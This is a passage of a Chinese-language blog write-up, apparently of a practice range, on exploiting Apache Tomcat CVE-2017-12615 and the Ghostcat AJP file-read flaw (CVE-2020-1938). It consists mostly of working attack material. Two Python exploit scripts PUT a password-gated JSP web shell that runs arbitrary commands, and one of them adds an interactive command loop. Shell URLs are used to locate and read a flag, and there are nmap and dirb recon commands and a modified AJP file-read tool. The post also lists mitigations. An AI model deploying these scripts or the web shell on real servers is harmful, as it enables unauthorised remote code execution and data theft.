class="string">&#x27;-p&#x27;</span>,<span class="string">&#x27;--port&#x27;</span>,dest=<span class="string">&#x27;PORT&#x27;</span>,help=<span class="string">&#x27;target port[default:8080]&#x27;</span>,<span class="keyword">default</span>=<span class="string">&#x27;8080&#x27;</span>)</span><br><span class="line">parse.add_option(<span class="string">&#x27;-f&#x27;</span>,dest=<span class="string">&#x27;FILE&#x27;</span>,help=<span class="string">&#x27;target list&#x27;</span>)</span><br><span class="line"></span><br><span class="line">options,args = parse.parse_args()</span><br><span class="line">#<span class="built_in">print</span>(options)</span><br><span class="line">#验证参数是否完整</span><br><span class="line"><span class="keyword">if</span> (not options.URL or not options.PORT) and not options.FILE:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Usage:python3 CVE-2017-12615-POC.py [-u url] [-p port] [-f FILE]\n&#x27;</span>)</span><br><span class="line">        exit(<span class="string">&#x27;CVE-2017-12615-POC.py:error:missing a mandatory option(-u,-p).Use -h for basic and -hh for advanced help&#x27;</span>)</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&#x27;/hello.jsp&#x27;</span></span><br><span class="line"></span><br><span class="line">#测试数据</span><br><span class="line">data = <span class="string">&#x27;hello&#x27;</span></span><br><span class="line"></span><br><span class="line">#提交PUT请求</span><br><span class="line">#resp = requests.post(url1,headers=headers,data=data)</span><br><span class="line"></span><br><span class="line">#验证文件是否上传成功</span><br><span class="line">#response = requests.get(url2)</span><br><span class="line">#上传文件</span><br><span class="line">def upload(url):</span><br><span class="line">  try:</span><br><span class="line">    response = requests.put(url+filename+<span class="string">&#x27;/&#x27;</span>,data=data)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">  except Exception as e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] &#123;0&#125; 连接失败&quot;</span>.format(url))</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">def checking(url):</span><br><span class="line">  try:</span><br><span class="line">    #验证文件是否上传成功</span><br><span class="line">    response = requests.get(url+filename)</span><br><span class="line">    #<span class="built_in">print</span>(url+filename)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span> and <span class="string">&#x27;hello&#x27;</span> in response.text:</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&#x27;[+] &#123;0&#125; 存在CVE-2017-12615 Tomcat 任意文件读写漏洞&#x27;</span>.format(url))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&#x27;[-] &#123;0&#125; 不存在CVE-2017-12615 Tomcat 任意文件读写漏洞&#x27;</span>.format(url))</span><br><span class="line">  except Exception as e:</span><br><span class="line">                #<span class="built_in">print</span>(e)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] &#123;0&#125; 连接失败&quot;</span>.format(url))</span><br><span class="line"><span class="keyword">if</span> options.FILE and os.path.exists(options.FILE):</span><br><span class="line">  with open(options.FILE) as f:</span><br><span class="line">    urls = f.readlines()</span><br><span class="line">    #<span class="built_in">print</span>(urls)</span><br><span class="line">    <span class="keyword">for</span> url in urls:</span><br><span class="line">      url = str(url).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;&#x27;</span>).strip()</span><br><span class="line">      <span class="keyword">if</span> upload(url) == <span class="number">1</span>:</span><br><span class="line">        checking(url)</span><br><span class="line">elif options.FILE and not os.path.exists(options.FILE):</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&#x27;[-] &#123;0&#125; 文件不存在&#x27;</span>.format(options.FILE))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">  #上传链接</span><br><span class="line">  url = options.URL+<span class="string">&#x27;:&#x27;</span>+options.PORT</span><br><span class="line">  <span class="keyword">if</span> upload(url) == <span class="number">1</span>:</span><br><span class="line">    checking(url)</span><br></pre></td></tr></table></figure></li><li><p>纸机大佬写的exp</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">#CVE<span class="number">-2017</span><span class="number">-12615</span> EXP</span><br><span class="line">#python3 CVE<span class="number">-2017</span><span class="number">-15715</span>-EXP.py.py -u http:<span class="comment">//106.15.50.112 -p 18082</span></span><br><span class="line">__author__ = <span class="string">&#x27;纸机&#x27;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> optparse</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">parse = optparse.OptionParser(usage = <span class="string">&#x27;python3 %prog [-h] [-u URL] [-p PORT]&#x27;</span>)</span><br><span class="line">parse.add_option(<span class="string">&#x27;-u&#x27;</span>,<span class="string">&#x27;--url&#x27;</span>,dest=<span class="string">&#x27;URL&#x27;</span>,help=<span class="string">&#x27;target url&#x27;</span>)</span><br><span class="line">parse.add_option(<span class="string">&#x27;-p&#x27;</span>,<span class="string">&#x27;--port&#x27;</span>,dest=<span class="string">&#x27;PORT&#x27;</span>,help=<span class="string">&#x27;target port[default:8080]&#x27;</span>,<span class="keyword">default</span>=<span class="string">&#x27;8080&#x27;</span>)</span><br><span class="line"></span><br><span class="line">options,args = parse.parse_args()</span><br><span class="line">#验证参数是否完整</span><br><span class="line"><span class="keyword">if</span> not options.URL or not options.PORT:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Usage:python3 CVE-2017-12615-POC.py [-u url] [-p port]\n&#x27;</span>)</span><br><span class="line">        exit(<span class="string">&#x27;CVE-2017-12615-POC.py:error:missing a mandatory option(-u,-p).Use -h for basic and -hh for advanced help&#x27;</span>)</span><br><span class="line"></span><br><span class="line">url = options.URL+<span class="string">&#x27;:&#x27;</span>+options.PORT</span><br><span class="line">filename = <span class="string">&#x27;/backdoor.jsp&#x27;</span></span><br><span class="line">payload = filename+<span class="string">&#x27;?pwd=023&amp;i=&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0&quot;</span>&#125;</span><br><span class="line">#木马</span><br><span class="line">data = <span class="string">&#x27;&#x27;</span><span class="string">&#x27;&lt;%</span></span><br><span class="line"><span class="string">    if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span></span><br><span class="line"><span class="string">        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();</span></span><br><span class="line"><span class="string">        int a = -1;</span></span><br><span class="line"><span class="string">        byte[] b = new byte[2048];</span></span><br><span class="line"><span class="string">        out.print(&quot;&lt;pre&gt;&quot;);</span></span><br><span class="line"><span class="string">        while((a=in.read(b))!=-1)&#123;</span></span><br><span class="line"><span class="string">            out.println(new String(b));</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        out.print(&quot;&lt;/pre&gt;&quot;);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">%&gt;&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">#上传木马文件</span><br><span class="line">def upload(url):</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&#x27;[*] 目标地址:&#x27;</span>+url)</span><br><span class="line">  try:</span><br><span class="line">    respond = requests.put(url+filename+<span class="string">&#x27;/&#x27;</span>,headers=headers,data = data)</span><br><span class="line">    #<span class="built_in">print</span>(respond.status_code)</span><br><span class="line">    <span class="keyword">if</span> respond.status_code == <span class="number">201</span> or respond.status_code == <span class="number">204</span>:</span><br><span class="line">      #<span class="built_in">print</span>(<span class="string">&#x27;[*] 目标地址:&#x27;</span>+url)</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&#x27;[+] 木马上传成功&#x27;</span>)</span><br><span class="line">  except Exception as e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[-] 上传失败&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">#命令执行</span><br><span class="line">def attack(url,cmd):</span><br><span class="line">  try:</span><br><span class="line">    respond = requests.get(url+payload+cmd)</span><br><span class="line">    <span class="keyword">if</span> respond.status_code == <span class="number">200</span>:</span><br><span class="line">      <span class="built_in">print</span>(str(respond.text).replace(<span class="string">&quot;&lt;pre&gt;&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&lt;/pre&gt;&quot;</span>,<span class="string">&quot;&quot;</span>).strip())</span><br><span class="line"></span><br><span class="line">  except Exception as e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[-] 命令执行错误&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> upload(url) == <span class="number">0</span>:</span><br><span class="line">        exit()</span><br><span class="line">time.sleep(<span class="number">0.5</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;输入执行命令(quit退出):&#x27;</span>)</span><br><span class="line">while(<span class="number">1</span>):</span><br><span class="line">  cmd = input(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>)</span><br><span class="line">  <span class="keyword">if</span>(cmd == <span class="string">&#x27;quit&#x27;</span>):</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">  attack(url,cmd)</span><br></pre></td></tr></table></figure></li></ul><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/0xtlu/blogsPicture@main/20220828/tumeiimage.346f3289d7u0.jpg?raw=true" alt="tumeiimage"></p><h3 id="0b10其他大佬脚本"><a href="#0b10其他大佬脚本" class="headerlink" title="0b10其他大佬脚本"></a>0b10其他大佬脚本</h3><ul><li>脚本一把梭<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">运行脚本：python3 CVE<span class="number">-2017</span><span class="number">-12615.</span>py http:<span class="comment">//106.15.50.112:18082</span></span><br><span class="line"></span><br><span class="line">http:<span class="comment">//106.15.50.112:18082/201712615.jsp?pwd=fff&amp;cmd=find%20/%20-name%20*flag*</span></span><br><span class="line">或</span><br><span class="line">http:<span class="comment">//106.15.50.112:18082/201712615.jsp?pwd=fff&amp;cmd=ls%20-R</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 拿flag：flag&#123;1835f7ba6689c37d4804bdfdbc4fd70d&#125;</span></span><br><span class="line">http:<span class="comment">//106.15.50.112:18082/201712615.jsp?pwd=fff&amp;cmd=cat%20/usr/local/tomcat/webapps/ROOT/this_flag_6689c37d4804bdfd.txt</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Usage:</span></span><br><span class="line"><span class="string">	python CVE-2017-12615.py http://127.0.0.1</span></span><br><span class="line"><span class="string">	shell: http://127.0.0.1/201712615.jsp?pwd=fff&amp;cmd=whoami</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">url</span>):</span><br><span class="line">	user_agent=<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36&quot;</span></span><br><span class="line">	headers=&#123;<span class="string">&quot;User-Agent&quot;</span>:user_agent&#125;</span><br><span class="line">	data=<span class="string">&quot;&quot;&quot;&lt;%</span></span><br><span class="line"><span class="string">    if(&quot;fff&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span></span><br><span class="line"><span class="string">        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream();</span></span><br><span class="line"><span class="string">        int a = -1;</span></span><br><span class="line"><span class="string">        byte[] b = new byte[2048];</span></span><br><span class="line"><span class="string">        out.print(&quot;&lt;pre&gt;&quot;);</span></span><br><span class="line"><span class="string">        while((a=in.read(b))!=-1)&#123;</span></span><br><span class="line"><span class="string">            out.println(new String(b));</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        out.print(&quot;&lt;/pre&gt;&quot;);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">%&gt;&quot;&quot;&quot;</span></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		requests.put(url, headers=headers, data=data)</span><br><span class="line"> </span><br><span class="line">		time.sleep(<span class="number">2</span>)</span><br><span class="line"> </span><br><span class="line">		verify_response = requests.get(url[:-<span class="number">1</span>], headers=headers)</span><br><span class="line"> </span><br><span class="line">		<span class="keyword">if</span> verify_response.status_code == <span class="number">200</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;success&#x27;</span>)</span><br><span class="line">		<span class="keyword">else</span> :</span><br><span class="line">			<span class="built_in">print</span> (verify_response.status_code)</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">except</span> :</span><br><span class="line">		<span class="string">&quot;error&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	target_url = sys.argv[<span class="number">1</span>] + <span class="string">&#x27;/201712615.jsp/&#x27;</span></span><br><span class="line"> </span><br><span class="line">	attack(target_url)</span><br><span class="line">	<span class="built_in">print</span> (<span class="string">&#x27;shell: &#x27;</span> + target_url[:-<span class="number">1</span>])</span><br><span class="line"> </span><br></pre></td></tr></table></figure></li></ul><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/0xtlu/blogsPicture@main/20220828/tumeiimage.1i6zcuqf5txc.jpg?raw=true" alt="tumeiimage"></p><h2 id="0o02-CVE-2017-12615"><a href="#0o02-CVE-2017-12615" class="headerlink" title="0o02 CVE-2017-12615"></a>0o02 CVE-2017-12615</h2><ul><li>漏洞概述：运行在 Windows 操作系统的 Tomcat ，启用 HTTP PUT 请求方法（readonly 初始化参数由默认值 true 设置为 false），则攻击者可构造恶意请求包向服务器上传包含任意代码的 JSP 文件。当JSP文件中的恶意代码被服务器执行时，将导致服务器上的数据泄露或获取服务器权限。</li><li>影响范围：Apache Tomcat 7.0.0 - 7.0.79。</li><li>漏洞防护：① 设置 conf&#x2F;webxml 文件的 readOnly 值为 Ture 或注释参数；② 禁用 PUT 方法并重启 tomcat 服务。注：禁用 PUT 方法时，对于依赖 PUT 方法的应用可能会导致业务失效；③ 升级到最新版本；④ 使用WAF产品进行防御。</li><li>注：通过对站点的观察：<code>Apache Tomcat/8.5.19</code>；对 URL 大小写判断，初步判断为 Linux 系统；这是扩大范围了？</li></ul><h1 id="0x03-Apache-Tomcat-AJP-文件包含漏洞"><a href="#0x03-Apache-Tomcat-AJP-文件包含漏洞" class="headerlink" title="0x03 Apache Tomcat AJP 文件包含漏洞"></a>0x03 Apache Tomcat AJP 文件包含漏洞</h1><h2 id="0o00-题目提示-3"><a href="#0o00-题目提示-3" class="headerlink" title="0o00 题目提示"></a>0o00 题目提示</h2><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Apache Tomcat AJP 文件包含漏洞（CVE-<span class="number">2020</span>-<span class="number">1938</span>）</span><br><span class="line"></span><br><span class="line">题目URL：http://<span class="number">106.15</span>.<span class="number">50.112</span>:<span class="number">18080</span>/whalwl/</span><br><span class="line">ajp端口：<span class="number">18009</span></span><br><span class="line"></span><br><span class="line">Ghostcat（幽灵猫） 是由长亭科技安全研究员发现的存在于 Tomcat 中的安全漏洞，</span><br><span class="line">由于 Tomcat AJP 协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件，</span><br><span class="line">例如可以读取 webapp 配置文件或源代码。此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。</span><br><span class="line">这个漏洞影响全版本默认配置下的 Tomcat（在我们发现此漏洞的时候，确认其影响 Tomcat <span class="number">9</span>/<span class="number">8</span>/<span class="number">7</span>/<span class="number">6</span> 全版本，</span><br><span class="line">而年代过于久远的更早的版本未进行验证），这意味着它在 Tomcat 里已经潜伏了长达十多年的时间。</span><br></pre></td></tr></table></figure><h2 id="0o01-测试过程-3"><a href="#0o01-测试过程-3" class="headerlink" title="0o01 测试过程"></a>0o01 测试过程</h2><h3 id="0b000-版本探测"><a href="#0b000-版本探测" class="headerlink" title="0b000 版本探测"></a>0b000 版本探测</h3><ul><li>nmap探测<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 18009端口，Apache Tomcat 9.0.30，满足CVE-2020-1938存在环境</span></span><br><span class="line">sudo nmap 106.15.50.112 -p 18080 -sV -sS</span><br><span class="line"></span><br><span class="line"><span class="comment"># 18009端口，探测不出服务，被ban</span></span><br><span class="line">sudo nmap 106.15.50.112 -p 18009 -sV -sS</span><br><span class="line"></span><br><span class="line"><span class="comment"># 整合</span></span><br><span class="line">sudo nmap 106.15.50.112 -p 18009,18080 -sV -sS</span><br></pre></td></tr></table></figure></li></ul><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/0xtlu/blogsPicture@main/20220828/tumeiimage.18y6993daxog.jpg?raw=true" alt="tumeiimage"></p><ul><li>报错探测<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">106.15</span><span class="number">.50</span><span class="number">.112</span>:<span class="number">18080</span>/whalwl/admin</span><br></pre></td></tr></table></figure></li></ul><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/0xtlu/blogsPicture@main/20220828/tumeiimage.5r0ush0hao40.jpg?raw=true" alt="tumeiimage"></p><h3 id="0b001-脚本测试"><a href="#0b001-脚本测试" class="headerlink" title="0b001 脚本测试"></a>0b001 脚本测试</h3><ul><li>AjPy验证工具：<a class="link" target="_blank" rel="noopener" href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi<i class="fas fa-external-link-alt"></i></a></li><li>通过python脚本利用AJP BUG读取webapp任意目录下文件，以<code>/WEB-INF/web.xml</code>为例</li><li>默认 Python2 环境运行</li><li>???路径有问题???修复了???</li><li>测试读取不存在文件，报错：<code>HTTP Status 500 – Internal Server Error</code>–&gt;确定：路径问题。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">python2 CNVD-<span class="number">2020</span>-<span class="number">10487</span>-Tomcat-Ajp-lfi.py <span class="number">106.15</span><span class="number">.50</span><span class="number">.112</span> -p <span class="number">18009</span> -f WEB-INF/web.xml</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注 </span></span><br><span class="line"><span class="comment"># python3的使用</span></span><br><span class="line"><span class="comment"># 听说，如下修改 CNVD-2020-10487-Tomcat-Ajp-lfi.py</span></span><br><span class="line"><span class="comment"># 测试，没成功</span></span><br><span class="line"><span class="comment"># 报错：AttributeError: &#x27;Tomcat&#x27; object has no attribute &#x27;stream&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">self.socket.makefile(&quot;rb&quot;, bufsize=0)</span></span><br><span class="line"><span class="string">替换为</span></span><br><span class="line"><span class="string">self.socket.makefile(&quot;rb&quot;, buffering=0)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print(&quot;&quot;.join([d.data for d in data]))</span></span><br><span class="line"><span class="string">替换为</span></span><br><span class="line"><span class="string">print(&quot;&quot;.join([d.data.decode() for d in data]))</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></li></ul><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/0xtlu/blogsPicture@main/20220828/tumeiimage.4xzuug38p0w0.jpg?raw=true" alt="tumeiimage"></p><h3 id="0b010-目录说明"><a href="#0b010-目录说明" class="headerlink" title="0b010 目录说明"></a>0b010 目录说明</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># vulhub 漏洞靶机中8080端口的网站根目录</span></span><br><span class="line">/usr/local/tomcat/webapps/ROOT</span><br><span class="line"></span><br><span class="line"><span class="comment"># 搭建靶场</span></span><br><span class="line"><span class="comment"># 物理路径：</span></span><br><span class="line">/usr/local/tomcat/webapps/ROOT/test/CVE-<span class="number">2020</span>-<span class="number">19381.</span>png</span><br><span class="line"><span class="comment"># 网络路径</span></span><br><span class="line">http://<span class="number">192.168</span><span class="number">.255</span><span class="number">.130</span>:<span class="number">8080</span>/test/CVE-<span class="number">2020</span>-<span class="number">19381.</span>png</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修复测试，无法修复</span></span><br><span class="line"><span class="comment"># 注释 conf/server.xml 中的&lt;Connector port=“8009” protocol=&quot;AJP/1.3&quot;redirectPort=“8443” /&gt;</span></span><br><span class="line"><span class="comment"># 报错，排除靶场漏洞已修复</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;CNVD-2020-10487-Tomcat-Ajp-lfi.py&quot;</span>, line <span class="number">295</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    t = Tomcat(args.target, args.port)</span><br><span class="line">  File <span class="string">&quot;CNVD-2020-10487-Tomcat-Ajp-lfi.py&quot;</span>, line <span class="number">261</span>, <span class="keyword">in</span> __init__</span><br><span class="line">    self.socket.connect((target_host, target_port))</span><br><span class="line">  File <span class="string">&quot;/usr/lib/python2.7/socket.py&quot;</span>, line <span class="number">228</span>, <span class="keyword">in</span> meth</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">getattr</span>(self._sock,name)(*args)</span><br><span class="line">socket.error: [Errno <span class="number">111</span>] Connection refused</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/0xtlu/blogsPicture@main/20220828/tumeiimage.7854hnbzp040.jpg?raw=true" alt="tumeiimage"></p><h3 id="0b011-跨目录问题"><a href="#0b011-跨目录问题" class="headerlink" title="0b011 跨目录问题"></a>0b011 跨目录问题</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 目录扫描命令</span></span><br><span class="line">dirb http://<span class="number">106.15</span><span class="number">.50</span><span class="number">.112</span>:<span class="number">18080</span>/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 结果</span></span><br><span class="line">+ http://<span class="number">106.15</span><span class="number">.50</span><span class="number">.112</span>:<span class="number">18080</span>/docs (CODE:<span class="number">302</span>|SIZE:<span class="number">0</span>)</span><br><span class="line">+ http://<span class="number">106.15</span><span class="number">.50</span><span class="number">.112</span>:<span class="number">18080</span>/examples (CODE:<span class="number">302</span>|SIZE:<span class="number">0</span>)</span><br><span class="line">+ http://<span class="number">106.15</span><span class="number">.50</span><span class="number">.112</span>:<span class="number">18080</span>/host-manager (CODE:<span class="number">302</span>|SIZE:<span class="number">0</span>)</span><br><span class="line">+ http://<span class="number">106.15</span><span class="number">.50</span><span class="number">.112</span>:<span class="number">18080</span>/manager (CODE:<span class="number">302</span>|SIZE:<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 又：靶场站点默认路径 http://106.15.50.112:18080/whalwl/</span></span><br><span class="line"><span class="comment"># 推测：/usr/local/tomcat/webapps/whalwl</span></span><br><span class="line"><span class="comment"># 即：ROOT 目录文件与 whalwl 同级</span></span><br><span class="line"><span class="comment"># 又：脚本默认读取 ROOT 目录中文件</span></span><br><span class="line"><span class="comment"># 故：若想读取 webapps 其他目录（如 whalwl）下的文件，需要对脚本进行修改，即问题所在</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如下代码已修改</span></span><br><span class="line"><span class="comment"># CNVD-2020-10487-Tomcat-Ajp-lfi.py 的 296行：</span></span><br><span class="line"><span class="comment"># _,data = t.perform_request(&#x27;/asdf&#x27;,attributes=[</span></span><br><span class="line"><span class="comment"># 修改为</span></span><br><span class="line"><span class="comment"># _,data = t.perform_request(&#x27;/whalwl/asdf&#x27;,attributes=[  </span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 